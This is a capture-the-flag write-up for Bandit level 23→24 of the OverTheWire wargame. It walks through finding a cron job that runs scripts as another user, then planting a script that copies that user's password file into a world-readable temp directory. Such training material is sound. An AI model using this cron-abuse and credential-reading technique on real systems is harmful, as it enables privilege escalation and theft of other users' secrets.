**Bandit Level 23 → Level 24 Write-up**

**Level Goal**



A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.



NOTE 1: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!



NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…



**Concepts Tested**



* Writing shell scripts
* Understanding cron job execution
* File permissions and ownership
* Creating scripts that will be executed by other users
* Working with temporary directories
* Script debugging and troubleshooting



**Solution**



Step 1: Connect to Bandit Level 23



SSH into the server using the password from the previous level:



```bash ssh bandit23@bandit.labs.overthewire.org -p 2220 ```



Step 2: Examine the Cron Job



Check the cron configuration:



```bash cat /etc/cron.d/cronjob_bandit24 ```



You'll see:



@reboot bandit24 /usr/bin/cronjob_bandit24.sh \&> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh \&> /dev/null



The job runs as bandit24 every minute.



Step 3: Read the Cron Script



Examine what the script does:



```bash cat /usr/bin/cronjob_bandit24.sh ```



You'll see something like:



#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo

echo "Executing and deleting all scripts in /var/spool/$myname/foo:"

for i in * .*;
do

  if [ "$i" != "." -a "$i" != ".." ];
  then
     echo "Handling $i"
     owner="$(stat --format "%U" ./$i)"
     if [ "${owner}" = "bandit23" ]; then
          timeout -s 9 60 ./$i
     fi
     rm -f ./$i
  fi
  done





What this script does:



Runs as bandit24 (via cron)



Goes to /var/spool/bandit24/foo/



Executes all scripts in that directory owned by bandit23

Deletes the scripts after execution



Step 4: Create a Working Directory



Create a temporary directory with secure permissions:



```bash mktemp -d ```



# Output: /tmp/tmp.XXXXXXXXXX



```bash cd /tmp/tmp.XXXXXXXXXX ```



Step 5: Create Your Script



Write a script that copies bandit24's password to a file you can read:



```bash nano script.sh ```



Or use vi or create the file with cat:



```bash cat > script.sh << 'EOF' ```



#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.XXXXXXXXXX/password.txt
chmod 666 /tmp/tmp.XXXXXXXXXX/password.txt
EOF


Replace /tmp/tmp.XXXXXXXXXX with your actual temp directory path!



What the script does:



Copies bandit24's password to your temp directory



Sets permissions so you can read it (666 = read/write for everyone)

```bash chmod 666 /tmp/tmp.XXXXXXXXXX/password.txt ```



Step 6: Make Your Script Executable



Set proper permissions on your script:



```bash chmod 777 script.sh ```
```bash chmod 777 /tmp/tmp.XXXXXXXXXX ```



We use 777 (everyone can read, write, execute) because:



The script needs to be executable by bandit24



The script needs to write to your directory



Step 7: Copy Script to the Execution Directory



Copy your script to where the cron job will find it:



```bash cp script.sh /var/spool/bandit24/foo/ ```



Step 8: Wait for Cron to Execute



The cron job runs every minute. Wait up to 60 seconds, then check for the password file:



```bash ls -la ```

```bash cat password.txt ```



If the file doesn't appear, wait a bit longer. The script will be deleted after execution, but your password file should remain.





**password level 23-24:** ###############################







